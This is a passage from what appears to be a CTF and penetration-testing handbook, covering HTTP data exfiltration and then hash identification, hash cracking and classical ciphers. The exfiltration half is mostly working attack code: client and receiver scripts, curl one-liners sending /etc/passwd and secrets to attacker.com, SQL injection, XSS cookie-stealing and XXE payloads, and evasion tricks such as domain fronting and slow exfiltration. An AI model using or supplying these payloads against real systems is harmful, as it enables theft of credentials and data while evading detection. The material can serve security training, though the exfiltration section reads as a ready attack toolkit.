                response = requests.get(
                    url,
                    params={'chunk': i, 'data': chunk, 'total': len(chunks)},
                    timeout=30
                )
                print(f"Sent chunk {i+1}/{len(chunks)}")
        
        print(f"Status: {response.status_code}")
        return True
        
    except Exception as e:
        print(f"Error: {e}")
        return False

def exfiltrate_multipart(filename, url):
    """Exfiltrate file as multipart upload"""
    
    print(f"Uploading {filename}")
    
    try:
        with open(filename, 'rb') as f:
            files = {'file': (os.path.basename(filename), f)}
            response = requests.post(url, files=files, timeout=30)
        
        print(f"Status: {response.status_code}")
        return True
        
    except Exception as e:
        print(f"Error: {e}")
        return False

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print(f"Usage: {sys.argv[0]} <file> <url> [method]")
        print("Methods: POST, GET, multipart")
        sys.exit(1)
    
    filename = sys.argv[1]
    url = sys.argv[2]
    method = sys.argv[3] if len(sys.argv) > 3 else 'POST'
    
    if method.lower() == 'multipart':
        exfiltrate_multipart(filename, url)
    else:
        exfiltrate_http(filename, url, method)
```

**Server Script (Receiver)**

```python
#!/usr/bin/env python3
from flask import Flask, request, jsonify
import base64
import os

app = Flask(__name__)
UPLOAD_DIR = '/tmp/exfil'

# Create upload directory
os.makedirs(UPLOAD_DIR, exist_ok=True)

@app.route('/exfil', methods=['GET', 'POST'])
def exfil():
    """Handle exfiltration requests"""
    
    if request.method == 'POST':
        # Handle POST data
        data = request.form.get('data') or request.json.get('data')
        filename = request.form.get('filename') or request.json.get('filename', 'unknown')
        
        if data:
            # Decode and save
            try:
                decoded = base64.b64decode(data)
                filepath = os.path.join(UPLOAD_DIR, filename)
                
                with open(filepath, 'wb') as f:
                    f.write(decoded)
                
                print(f"Received: {filename} ({len(decoded)} bytes)")
                return jsonify({'status': 'success', 'size': len(decoded)}), 200
            
            except Exception as e:
                print(f"Error: {e}")
                return jsonify({'status': 'error', 'message': str(e)}), 500
    
    elif request.method == 'GET':
        # Handle GET chunked data
        chunk_num = request.args.get('chunk')
        data = request.args.get('data')
        total_chunks = request.args.get('total')
        
        if chunk_num and data:
            # Save chunk
            chunk_file = os.path.join(UPLOAD_DIR, f'chunk_{chunk_num}.txt')
            
            with open(chunk_file, 'w') as f:
                f.write(data)
            
            print(f"Received chunk {chunk_num}/{total_chunks}")
            return jsonify({'status': 'success', 'chunk': chunk_num}), 200
    
    return jsonify({'status': 'ready'}), 200

@app.route('/upload', methods=['POST'])
def upload():
    """Handle multipart file uploads"""
    
    if 'file' not in request.files:
        return jsonify({'status': 'error', 'message': 'No file'}), 400
    
    file = request.files['file']
    
    if file.filename:
        filepath = os.path.join(UPLOAD_DIR, file.filename)
        file.save(filepath)
        
        size = os.path.getsize(filepath)
        print(f"Received: {file.filename} ({size} bytes)")
        
        return jsonify({'status': 'success', 'filename': file.filename, 'size': size}), 200
    
    return jsonify({'status': 'error'}), 400

@app.route('/reassemble', methods=['GET'])
def reassemble():
    """Reassemble chunked data"""
    
    # Find all chunk files
    chunks = sorted([f for f in os.listdir(UPLOAD_DIR) if f.startswith('chunk_')],
                    key=lambda x: int(x.split('_')[1].split('.')[0]))
    
    if not chunks:
        return jsonify({'status': 'error', 'message': 'No chunks found'}), 404
    
    # Reassemble
    complete_data = ''
    for chunk_file in chunks:
        with open(os.path.join(UPLOAD_DIR, chunk_file), 'r') as f:
            complete_data += f.read()
    
    # Decode and save
    try:
        decoded = base64.b64decode(complete_data)
        output_file = os.path.join(UPLOAD_DIR, 'reassembled_file')
        
        with open(output_file, 'wb') as f:
            f.write(decoded)
        
        # Clean up chunks
        for chunk_file in chunks:
            os.remove(os.path.join(UPLOAD_DIR, chunk_file))
        
        return jsonify({'status': 'success', 'size': len(decoded), 'file': output_file}), 200
    
    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500

if __name__ == '__main__':
    print(f"Exfiltration server running")
    print(f"Upload directory: {UPLOAD_DIR}")
    app.run(host='0.0.0.0', port=80, debug=False)
```

### HTTP Header Exfiltration

**Custom Headers**

```bash
# X-Custom headers
curl -H "X-User: $(whoami | base64)" \
     -H "X-Host: $(hostname | base64)" \
     -H "X-Data: $(cat /etc/passwd | base64 | head -c 1000)" \
     http://attacker.com/

# Multiple sequential requests for large data
cat /etc/passwd | base64 | fold -w 1000 | nl -v 0 | while read num chunk; do
    curl -H "X-Chunk: $num" -H "X-Data: $chunk" http://attacker.com/
done
```

**Standard Header Abuse**

```bash
# User-Agent
curl -A "Mozilla/5.0 (Data: $(cat secret.txt | base64))" http://attacker.com/

# Referer
curl -e "http://previous.site/$(cat secret.txt | base64)" http://attacker.com/

# Accept-Language
curl -H "Accept-Language: $(cat secret.txt | base64)" http://attacker.com/

# Authorization
curl -H "Authorization: Bearer $(cat secret.txt | base64)" http://attacker.com/

# Cookie
curl -b "session=abc123; data=$(cat secret.txt | base64)" http://attacker.com/
```

### WebSocket Exfiltration

**Python WebSocket Client**

```python
#!/usr/bin/env python3
import websocket
import base64
import sys

def exfiltrate_websocket(filename, ws_url):
    """Exfiltrate via WebSocket"""
    
    # Read file
    with open(filename, 'rb') as f:
        data = f.read()
    
    # Encode
    encoded = base64.b64encode(data).decode()
    
    # Connect and send
    ws = websocket.create_connection(ws_url)
    
    # Send metadata
    ws.send(f"FILE:{filename}")
    
    # Send data in chunks
    chunk_size = 4096
    chunks = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
    
    for i, chunk in enumerate(chunks):
        ws.send(f"CHUNK:{i}:{chunk}")
        print(f"Sent chunk {i+1}/{len(chunks)}")
    
    ws.send("EOF")
    ws.close()
    
    print("Exfiltration complete")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <file> <ws://url>")
        sys.exit(1)
    
    exfiltrate_websocket(sys.argv[1], sys.argv[2])
```

**WebSocket Server**

```python
#!/usr/bin/env python3
from flask import Flask
from flask_sock import Sock
import base64

app = Flask(__name__)
sock = Sock(app)

current_file = {'name': None, 'chunks': {}}

@sock.route('/exfil')
def exfil(ws):
    """WebSocket exfiltration handler"""
    
    print("Client connected")
    
    while True:
        message = ws.receive()
        
        if message is None:
            break
        
        if message.startswith("FILE:"):
            current_file['name'] = message.split(":", 1)[1]
            current_file['chunks'] = {}
            print(f"Receiving file: {current_file['name']}")
        
        elif message.startswith("CHUNK:"):
            parts = message.split(":", 2)
            chunk_num = int(parts[1])
            chunk_data = parts[2]
            current_file['chunks'][chunk_num] = chunk_data
            print(f"Received chunk {chunk_num}")
        
        elif message == "EOF":
            # Reassemble file
            sorted_chunks = [current_file['chunks'][i] 
                           for i in sorted(current_file['chunks'].keys())]
            complete_data = ''.join(sorted_chunks)
            
            # Decode and save
            decoded = base64.b64decode(complete_data)
            filename = f"/tmp/exfil/{current_file['name']}"
            
            with open(filename, 'wb') as f:
                f.write(decoded)
            
            print(f"Saved: {filename} ({len(decoded)} bytes)")
            ws.send("ACK")
            break
    
    print("Client disconnected")

if __name__ == '__main__':
    import os
    os.makedirs('/tmp/exfil', exist_ok=True)
    app.run(host='0.0.0.0', port=8080)
```

### HTTP/HTTPS via Steganography

**Steganography in HTTP**

```bash
# Hide data in image and upload via HTTP

# Install steghide
apt install steghide

# Embed data in image
steghide embed -cf image.jpg -ef secret.txt -p password

# Upload image via HTTP
curl -X POST -F "image=@image.jpg" http://attacker.com/upload

# On attacker side: Extract data
steghide extract -sf image.jpg -p password
```

**LSB Steganography**

```python
#!/usr/bin/env python3
from PIL import Image
import sys

def embed_data(image_path, data, output_path):
    """Embed data in image using LSB steganography"""
    
    img = Image.open(image_path)
    encoded = img.copy()
    width, height = img.size
    
    # Convert data to binary
    binary_data = ''.join(format(byte, '08b') for byte in data.encode())
    data_len = len(binary_data)
    
    # Check if image can hold data
    if data_len > width * height * 3:
        raise ValueError("Image too small for data")
    
    data_index = 0
    
    for y in range(height):
        for x in range(width):
            if data_index >= data_len:
                break
            
            pixel = list(img.getpixel((x, y)))
            
            # Modify RGB values
            for i in range(3):
                if data_index < data_len:
                    pixel[i] = (pixel[i] & ~1) | int(binary_data[data_index])
                    data_index += 1
            
            encoded.putpixel((x, y), tuple(pixel))
        
        if data_index >= data_len:
            break
    
    encoded.save(output_path)
    print(f"Data embedded in {output_path}")

def extract_data(image_path, data_length):
    """Extract data from image"""
    
    img = Image.open(image_path)
    width, height = img.size
    
    binary_data = ""
    
    for y in range(height):
        for x in range(width):
            pixel = img.getpixel((x, y))
            
            for value in pixel[:3]:
                binary_data += str(value & 1)
    
    # Convert binary to text
    chars = [binary_data[i:i+8] for i in range(0, len(binary_data), 8)]
    message = ''.join(chr(int(char, 2)) for char in chars if char)
    
    return message[:data_length]

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} embed <image> <data> <output>")
        print(f"       {sys.argv[0]} extract <image> <length>")
        sys.exit(1)
    
    if sys.argv[1] == 'embed':
        embed_data(sys.argv[2], sys.argv[3], sys.argv[4])
    elif sys.argv[1] == 'extract':
        data = extract_data(sys.argv[2], int(sys.argv[3]))
        print(data)
```

### Advanced HTTP Exfiltration Techniques

**HTTP Chunked Transfer Encoding**

```python
#!/usr/bin/env python3
import socket
import sys

def chunked_exfiltrate(filename, host, port=80):
    """Exfiltrate using HTTP chunked encoding"""
    
    with open(filename, 'rb') as f:
        data = f.read()
    
    # Create socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    
    # Send HTTP headers
    headers = f"POST /exfil HTTP/1.1\r\n"
    headers += f"Host: {host}\r\n"
    headers += "Transfer-Encoding: chunked\r\n"
    headers += "Content-Type: application/octet-stream\r\n\r\n"
    
    s.send(headers.encode())
    
    # Send data in chunks
    chunk_size = 1024
    for i in range(0, len(data), chunk_size):
        chunk = data[i:i+chunk_size]
        chunk_header = f"{len(chunk):X}\r\n".encode()
        s.send(chunk_header + chunk + b"\r\n")
        print(f"Sent {i+len(chunk)}/{len(data)} bytes")
    
    # Send final chunk
    s.send(b"0\r\n\r\n")
    
    # Receive response
    response = s.recv(4096)
    print(f"Response: {response.decode()}")
    
    s.close()

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <file> <host>")
        sys.exit(1)
    
    chunked_exfiltrate(sys.argv[1], sys.argv[2])
```

**HTTP/2 Exfiltration**

```python
#!/usr/bin/env python3
import httpx
import asyncio
import sys

async def http2_exfiltrate(filename, url):
    """Exfiltrate using HTTP/2"""
    
    with open(filename, 'rb') as f:
        data = f.read()
    
    async with httpx.AsyncClient(http2=True) as client:
        response = await client.post(
            url,
            content=data,
            headers={'Content-Type': 'application/octet-stream'}
        )
        
        print(f"Status: {response.status_code}")
        print(f"Protocol: {response.http_version}")
        return response.status_code == 200

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <file> <url>")
        sys.exit(1)
    
    asyncio.run(http2_exfiltrate(sys.argv[1], sys.argv[2]))
```

### Exfiltration via Compromised Web Applications

**SQL Injection Exfiltration**

```bash
# Out-of-band data exfiltration via SQL injection

# DNS exfiltration via SQL injection (MySQL)
' UNION SELECT LOAD_FILE('/etc/passwd') INTO OUTFILE '\\\\attacker.com\\share\\passwd.txt'--

# HTTP exfiltration (MySQL with UDF)
' UNION SELECT sys_exec('curl http://attacker.com/?data=$(cat /etc/passwd | base64)')--

# MSSQL xp_cmdshell exfiltration
'; EXEC xp_cmdshell 'powershell -c "Invoke-WebRequest -Uri http://attacker.com/exfil -Method POST -Body (Get-Content C:\sensitive.txt)"'--
```

**XSS-Based Exfiltration**

```javascript
// JavaScript payload for XSS exfiltration

// Exfiltrate cookies
<script>
fetch('http://attacker.com/exfil?cookies=' + btoa(document.cookie));
</script>

// Exfiltrate page content
<script>
fetch('http://attacker.com/exfil', {
    method: 'POST',
    body: btoa(document.documentElement.innerHTML)
});
</script>

// Exfiltrate local storage
<script>
fetch('http://attacker.com/exfil', {
    method: 'POST',
    body: JSON.stringify(localStorage)
});
</script>
```

**XXE (XML External Entity) Exfiltration**

```xml
<!-- XXE payload for file exfiltration -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % dtd SYSTEM "http://attacker.com/exfil.dtd">
  %dtd;
  %send;
]>
<foo>&external;</foo>
```

**External DTD (exfil.dtd)**

```xml
<!ENTITY % payload "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/exfil?data=%file;'>">
%payload;
```

### Detection Evasion Techniques

**Traffic Mimicry**

```bash
# Mimic legitimate user-agent strings
user_agents=(
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36"
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
)

# Random user-agent selection
ua=${user_agents[$RANDOM % ${#user_agents[@]}]}
curl -A "$ua" "http://attacker.com/exfil?data=$data"
```

**Domain Fronting**

```bash
# Use CDN domain fronting to hide true destination
curl -H "Host: attacker.com" https://cdn-provider.com/exfil -d "$data"

# CloudFront example
curl -H "Host: attacker.cloudfront.net" https://cloudfront.net/exfil -d "$data"
```

**Slow Exfiltration (Low and Slow)**

```bash
#!/bin/bash
# Slow exfiltration to evade rate-based detection

FILE="$1"
URL="$2"
DELAY_MIN=30
DELAY_MAX=300

cat "$FILE" | base64 | fold -w 100 | while read chunk; do
    # Random delay between requests
    sleep $(( $RANDOM % ($DELAY_MAX - $DELAY_MIN + 1) + $DELAY_MIN ))
    
    # Send chunk
    curl -s "$URL?d=$chunk" > /dev/null
done
```

**Protocol Switching**

```python
#!/usr/bin/env python3
import random
import requests
import sys

def multi_protocol_exfil(data, urls):
    """Rotate between multiple exfiltration channels"""
    
    protocols = [
        lambda d, u: requests.get(u, params={'data': d}),
        lambda d, u: requests.post(u, data={'data': d}),
        lambda d, u: requests.put(u, data=d),
    ]
    
    # Split data into chunks
    chunk_size = 500
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    
    for i, chunk in enumerate(chunks):
        # Random protocol and URL selection
        protocol = random.choice(protocols)
        url = random.choice(urls)
        
        try:
            protocol(chunk, url)
            print(f"Sent chunk {i+1}/{len(chunks)} via {url}")
        except Exception as e:
            print(f"Error: {e}")
        
        # Random delay
        time.sleep(random.randint(5, 20))

if __name__ == "__main__":
    # Multiple exfiltration endpoints
    urls = [
        'http://server1.attacker.com/exfil',
        'https://server2.attacker.com/upload',
        'http://server3.attacker.com/data'
    ]
    
    with open(sys.argv[1], 'r') as f:
        data = f.read()
    
    multi_protocol_exfil(data, urls)
```

### Compression Before Exfiltration

**[Inference]** Compressing data reduces bandwidth usage and transmission time, lowering detection probability.

```bash
# Gzip compression
cat /etc/passwd | gzip | base64 | tr -d '\n' > compressed.txt
curl "http://attacker.com/?data=$(cat compressed.txt)"

# On receiver side
echo "$data" | base64 -d | gunzip > passwd.txt

# Bzip2 compression (higher ratio)
cat largefile.txt | bzip2 | base64 | curl -X POST -d @- http://attacker.com/

# XZ compression (best ratio)
tar czf - /var/log/ | base64 | curl -X POST -d @- http://attacker.com/
```

### Encryption Before Exfiltration

**OpenSSL Encryption**

```bash
# Encrypt file before exfiltration
openssl enc -aes-256-cbc -salt -in /etc/passwd -out passwd.enc -pass pass:secret

# Encode and exfiltrate
cat passwd.enc | base64 | curl -X POST -d @- http://attacker.com/

# On receiver: decrypt
base64 -d | openssl enc -aes-256-cbc -d -pass pass:secret -out passwd.txt
```

**GPG Encryption**

```bash
# Encrypt with GPG
gpg --encrypt --recipient attacker@email.com /etc/passwd

# Exfiltrate encrypted file
curl -X POST -F "file=@passwd.gpg" http://attacker.com/

# Decrypt on receiver
gpg --decrypt passwd.gpg > passwd.txt
```

---

## Important Subtopics for Further Study

- **Covert Channel Analysis** - Advanced techniques using timing, storage, and behavioral channels
- **Network Protocol Abuse** - NTP, SMB, FTP, SMTP exfiltration methods
- **Physical Media Exfiltration** - USB, Bluetooth, and air-gapped network bridging
- **Cloud Service Abuse** - Leveraging legitimate services (Slack, Discord, Twitter APIs) for C2 and exfiltration
- **Anti-Forensics Techniques** - Log manipulation, timestamp modification, and artifact removal after exfiltration

---

# Cryptography & Reverse Engineering

Cryptography and reverse engineering are fundamental skills for CTF challenges involving encoded data, encrypted communications, malware analysis, and binary exploitation. This section covers identification, analysis, and breaking of cryptographic implementations and binary programs.

## Hash Identification

Hash identification is the first step in password cracking and data integrity verification. Hashes are one-way cryptographic functions that produce fixed-length outputs.

### Hash Identification Tools

**hashid:**

```bash
# Basic identification
hashid 'hash_string'

# Multiple hashes from file
hashid -m hashes.txt

# Show hashcat mode numbers
hashid -m 'hash_string'

# Show John the Ripper format
hashid -j 'hash_string'

# Example
hashid '5f4dcc3b5aa765d61d8327deb882cf99'
# Output: Possible hashes: MD5, MD4, NTLM, etc.
```

**hash-identifier:**

```bash
# Interactive mode
hash-identifier

# Direct hash analysis
echo 'hash_string' | hash-identifier

# Example
hash-identifier
> 5f4dcc3b5aa765d61d8327deb882cf99
```

**Hashcat hash examples:**

```bash
# List all hashcat modes
hashcat --help | grep -i "Hash modes"

# Common hash mode numbers
# 0     - MD5
# 100   - SHA1
# 1000  - NTLM
# 1400  - SHA256
# 1700  - SHA512
# 1800  - sha512crypt
# 3200  - bcrypt
# 5600  - NetNTLMv2
# 13100 - Kerberos 5 TGS-REP
# 18200 - Kerberos 5 AS-REP
```

### Common Hash Formats

**MD5 (128-bit / 32 hex characters):**

```
5f4dcc3b5aa765d61d8327deb882cf99
098f6bcd4621d373cade4e832627b4f6
```

**SHA-1 (160-bit / 40 hex characters):**

```
5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8
cbfdac6008f9cab4083784cbd1874f76618d2a97
```

**SHA-256 (256-bit / 64 hex characters):**

```
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
```

**SHA-512 (512-bit / 128 hex characters):**

```
b109f3bbbc244eb82441917ed06d618b9008dd09b3befd1b5e07394c706a8bb980b1d7785e5976ec049b46df5f1326af5a2ea6d103fd07c95385ffab0cacbc86
```

**NTLM (Windows NT LAN Manager):**

```
8846f7eaee8fb117ad06bdd830b7586c
32ed87bdb5fdc5e9cba88547376818d4
```

**bcrypt (Blowfish-based):**

```
$2a$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy
$2b$12$KIXn5DQXYv1qIRvRRANKIOZPEKdvGPHU0vxYmW.gBqNT.Zm0h4xqq
```

**sha512crypt (Unix/Linux):**

```
$6$rounds=5000$usesomesillystri$D4IrlXatmP7rx3P3InaxBeoomnAihCKRVQP22JZ6EY47Wc6BkroIuUUBOov1i.S5KPgErtP/EN5mcO.ChWQW21
```

**Linux /etc/shadow formats:**

```
$1$  - MD5
$2a$ - Blowfish/bcrypt
$2y$ - Blowfish/bcrypt
$5$  - SHA-256
$6$  - SHA-512
$y$  - yescrypt
```

### Hash Length Recognition

```bash
# Count hash characters
echo -n 'hash_string' | wc -c

# Quick identification by length
32 characters  -> MD5, NTLM, MD4
40 characters  -> SHA-1
56 characters  -> SHA-224
64 characters  -> SHA-256, SHA3-256
96 characters  -> SHA-384, SHA3-384
128 characters -> SHA-512, SHA3-512
```

### Hash Extraction from Files

```bash
# Extract hashes from /etc/shadow
cat /etc/shadow | cut -d: -f2

# Extract NTLM hashes from Windows SAM dump
cat sam_dump.txt | cut -d: -f4

# Find potential hashes in text file (32 chars)
grep -oE '[a-f0-9]{32}' file.txt

# Find potential SHA-1 hashes (40 chars)
grep -oE '[a-f0-9]{40}' file.txt

# Find potential SHA-256 hashes (64 chars)
grep -oE '[a-f0-9]{64}' file.txt
```

### Hash Cracking

**Hashcat:**

```bash
# MD5 cracking
hashcat -m 0 -a 0 hash.txt wordlist.txt

# NTLM cracking
hashcat -m 1000 -a 0 ntlm_hashes.txt rockyou.txt

# SHA-256 cracking
hashcat -m 1400 -a 0 sha256_hashes.txt wordlist.txt

# Brute force attack
hashcat -m 0 -a 3 hash.txt ?a?a?a?a?a?a

# Rule-based attack
hashcat -m 0 -a 0 hash.txt wordlist.txt -r rules/best64.rule

# Combination attack
hashcat -m 0 -a 1 hash.txt wordlist1.txt wordlist2.txt

# Mask attack (known pattern)
hashcat -m 0 -a 3 hash.txt password?d?d?d

# Show cracked hashes
hashcat -m 0 hash.txt --show
```

**John the Ripper:**

```bash
# Auto-detect format
john hash.txt

# Specify format
john --format=raw-md5 hash.txt

# With wordlist
john --wordlist=rockyou.txt hash.txt

# With rules
john --wordlist=wordlist.txt --rules hash.txt

# Incremental mode (brute force)
john --incremental hash.txt

# Show cracked passwords
john --show hash.txt

# Specific format examples
john --format=NT ntlm.txt
john --format=sha256crypt shadow.txt
john --format=bcrypt bcrypt_hashes.txt
```

**Online hash databases:**

```bash
# CrackStation
curl "https://crackstation.net/api.php" -d "hashes=hash1,hash2"

# Manual lookup sites (use browser)
# - crackstation.net
# - hashes.com
# - md5decrypt.net
# - hashkiller.io
```

### Salted Hashes

Salts prevent rainbow table attacks:

```bash
# Format: hash:salt
5f4dcc3b5aa765d61d8327deb882cf99:randomsalt

# MD5(pass:salt)
hashcat -m 20 hash:salt wordlist.txt

# SHA-256(pass:salt)
hashcat -m 1410 hash:salt wordlist.txt

# Unix shadow format (salt embedded)
username:$6$salt$hash

# Crack with hashcat
hashcat -m 1800 '$6$salt$hash' wordlist.txt
```

### Custom Hash Functions

CTF challenges often use custom implementations:

```python
# Example: Custom XOR-based hash
def custom_hash(data, key):
    result = 0
    for i, char in enumerate(data):
        result ^= ord(char) * (i + 1) * key
    return hex(result)[2:]

# Approach: Reverse engineer the algorithm
# 1. Analyze the code
# 2. Identify operations (XOR, rotation, addition)
# 3. Brute force small keyspace
# 4. Build rainbow table for known values
```

### Hash Collisions

Some hash functions are vulnerable to collisions:

```bash
# MD5 collision example (different inputs, same hash)
echo "d131dd02c5e6eec4693d9a0698aff95c2fcab58712467eab4004583eb8fb7f89" | xxd -r -p > file1
echo "d131dd02c5e6eec4693d9a0698aff95c2fcab50712467eab4004583eb8fb7f89" | xxd -r -p > file2
md5sum file1 file2
# Both produce: 79054025255fb1a26e4bc422aef54eb4
```

[Inference] MD5 and SHA-1 are considered broken for security purposes due to practical collision attacks. Modern applications should use SHA-256 or stronger.

## Encryption Algorithm Identification

Identifying encryption algorithms helps determine decryption approaches.

### Entropy Analysis

High entropy suggests encryption or compression:

```bash
# Calculate file entropy with ent
ent file.bin

# Output interpretation:
# Entropy: 7.9+ bits/byte = likely encrypted/compressed
# Entropy: <7.0 bits/byte = likely plaintext or simple encoding

# Alternative: binwalk entropy analysis
binwalk -E file.bin

# Python entropy calculation
python3 << EOF
import math
from collections import Counter

def entropy(data):
    if not data:
        return 0
    entropy = 0
    counter = Counter(data)
    for count in counter.values():
        p_x = count / len(data)
        if p_x > 0:
            entropy += - p_x * math.log2(p_x)
    return entropy

with open('file.bin', 'rb') as f:
    data = f.read()
    print(f"Entropy: {entropy(data):.4f} bits/byte")
EOF
```

### Magic Bytes and Headers

Identify encryption by file headers:

```bash
# Check magic bytes
xxd file.bin | head -n 5
hexdump -C file.bin | head -n 5

# Common encryption headers
# Salted__ (8 bytes) - OpenSSL encrypted
# PKCS#7/CMS - starts with 0x30 (ASN.1 SEQUENCE)
# PGP - starts with 0x85 or "-----BEGIN PGP"
# GPG - binary format, complex structure

# OpenSSL encrypted file
head -c 8 file.enc
# Output: Salted__

# File command
file file.enc
```

### Block Cipher Detection

```bash
# AES characteristics
# - Block size: 16 bytes (128 bits)
# - Key sizes: 128, 192, or 256 bits
# - File size: multiple of 16 bytes (with padding)

# Check if file size is multiple of 16
stat -c%s file.enc | awk '{print $1 % 16}'
# Output: 0 = likely block cipher

# DES characteristics
# - Block size: 8 bytes (64 bits)
# - Check multiple of 8

# Identify by file size patterns
ls -la *.enc | awk '{print $5 % 16, $9}'
```

### OpenSSL Encrypted Files

```bash
# OpenSSL enc format detection
head -c 8 file.enc
# Output: Salted__ (0x53616c7465645f5f)

# Decrypt OpenSSL file (try common algorithms)
openssl enc -d -aes-256-cbc -in file.enc -out file.dec -k password
openssl enc -d -aes-128-cbc -in file.enc -out file.dec -k password
openssl enc -d -des3 -in file.enc -out file.dec -k password

# Base64 encoded OpenSSL
openssl enc -d -aes-256-cbc -a -in file.b64 -out file.dec -k password

# List available ciphers
openssl enc -ciphers

# PBKDF2 key derivation (newer OpenSSL)
openssl enc -d -aes-256-cbc -pbkdf2 -in file.enc -out file.dec -k password
```

### GPG/PGP Detection

```bash
# Check for PGP headers
head file.gpg
# -----BEGIN PGP MESSAGE-----

# Binary PGP
hexdump -C file.gpg | head
# Look for 0x85 or 0x95 markers

# Decrypt PGP
gpg -d file.gpg > file.dec

# List keys
gpg --list-keys
gpg --list-secret-keys

# Import key
gpg --import key.asc
```

### ZIP/Archive Encryption

```bash
# Check ZIP encryption
zipinfo file.zip
# Look for "stored" vs "encrypted"

# 7zip detection
7z l file.7z
# Shows encryption method

# Crack ZIP password
fcrackzip -u -D -p rockyou.txt file.zip

# John the Ripper ZIP
zip2john file.zip > hash.txt
john hash.txt

# RAR password crack
rarcrack file.rar --type rar
```

### Certificate/Key Format Detection

```bash
# PEM format (Base64 encoded)
cat cert.pem
# -----BEGIN CERTIFICATE-----
# -----BEGIN RSA PRIVATE KEY-----
# -----BEGIN PRIVATE KEY-----

# DER format (binary)
file cert.der
# Output: data

# Check certificate details
openssl x509 -in cert.pem -text -noout
openssl x509 -inform DER -in cert.der -text -noout

# Check private key
openssl rsa -in key.pem -check
openssl rsa -inform DER -in key.der -check

# PKCS#12 format (.pfx, .p12)
openssl pkcs12 -info -in cert.pfx
```

### Algorithm-Specific Indicators

**AES:**

- Block size: 16 bytes
- Common modes: CBC, ECB, CTR, GCM
- File size: multiple of 16 (or 16 + random bytes for padding)
- OpenSSL: `aes-128-cbc`, `aes-256-gcm`

**RSA:**

- Asymmetric encryption
- Key sizes: 1024, 2048, 4096 bits
- PEM headers: `BEGIN RSA PRIVATE KEY`, `BEGIN PUBLIC KEY`
- Used for: key exchange, digital signatures

**DES/3DES:**

- Block size: 8 bytes
- Legacy, considered weak
- File size: multiple of 8

**ChaCha20:**

- Stream cipher
- Modern alternative to AES
- No block size requirements
- High performance

**Blowfish/Twofish:**

- Block size: 8 bytes (Blowfish), 16 bytes (Twofish)
- Variable key length
- Used in bcrypt password hashing

## Cipher Analysis

Classical and custom cipher analysis for CTF challenges.

### Caesar Cipher

Simple substitution with fixed shift:

```bash
# ROT13 (Caesar with shift 13)
echo "Text" | tr 'A-Za-z' 'N-ZA-Mn-za-m'

# Variable shift decode
for i in {0..25}; do
    echo "Shift $i: $(echo 'KHOOR' | tr "A-Z" "$(echo {A..Z} | tr -d ' ' | sed "s/.*/${&:$i}${&::$i}/")")"
done

# Python Caesar decoder
python3 << 'EOF'
def caesar_decrypt(ciphertext, shift):
    result = ""
    for char in ciphertext:
        if char.isalpha():
            ascii_offset = 65 if char.isupper() else 97
            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)
        else:
            result += char
    return result

ciphertext = "KHOOR ZRUOG"
for shift in range(26):
    print(f"Shift {shift:2d}: {caesar_decrypt(ciphertext, shift)}")
EOF

# CyberChef recipe
# https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)
```

### Substitution Cipher

Each letter maps to another letter:

```bash
# Frequency analysis
python3 << 'EOF'
from collections import Counter

ciphertext = "KHOOR ZRUOG"
freq = Counter(ciphertext.upper().replace(' ', ''))
print("Letter frequencies:")
for letter, count in freq.most_common():
    print(f"{letter}: {count}")

# English letter frequency (reference)
# E T A O I N S H R D L C U M W F G Y P B V K J X Q Z
EOF

# Automated solver (quipqiup online tool)
# or use substitution cipher crackers

# Manual mapping
echo "CIPHERTEXT" | tr 'ABCD' 'WXYZ'
```

### VigenÃ¨re Cipher

Polyalphabetic substitution using keyword:

```bash
# Identify VigenÃ¨re (index of coincidence analysis)
python3 << 'EOF'
def index_of_coincidence(text):
    text = text.upper().replace(' ', '')
    n = len(text)
    freqs = {}
    for char in text:
        freqs[char] = freqs.get(char, 0) + 1
    
    ic = sum(f * (f - 1) for f in freqs.values()) / (n * (n - 1))
    return ic

# IC â‰ˆ 0.065 for English plaintext
# IC â‰ˆ 0.038 for random/VigenÃ¨re
ciphertext = "YOUR CIPHERTEXT HERE"
print(f"IC: {index_of_coincidence(ciphertext):.4f}")
EOF

# Determine key length (Kasiski examination)
# Look for repeated sequences

# Crack VigenÃ¨re (online tools)
# - https://www.dcode.fr/vigenere-cipher
# - https://www.guballa.de/vigenere-solver

# Manual VigenÃ¨re decrypt
python3 << 'EOF'
def vigenere_decrypt(ciphertext, key):
    result = ""
    key = key.upper()
    key_index = 0
    
    for char in ciphertext:
        if char.isalpha():
            shift = ord(key[key_index % len(key)]) - 65
            ascii_offset = 65 if char.isupper() else 97
            result += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)
            key_index += 1
        else:
            result += char
    return result

ciphertext = "LXFOPVEFRNHR"
key = "LEMON"
print(vigenere_decrypt(ciphertext, key))
EOF
```

### XOR Cipher

Bitwise XOR with key:

```bash
# Single-byte XOR brute force
python3 << 'EOF'
ciphertext = bytes.fromhex("1b37373331363f78151b7f2b783431333d78397828372d363c78373e783a393b3736")

for key in range(256):
    plaintext = bytes([b ^ key for b in ciphertext])
    try:
        decoded = plaintext.decode('ascii')
        if all(32 <= ord(c) <= 126 or c == '\n' for c in decoded):
            print(f"Key {key:3d} (0x{key:02x}): {decoded}")
    except:
        pass
EOF

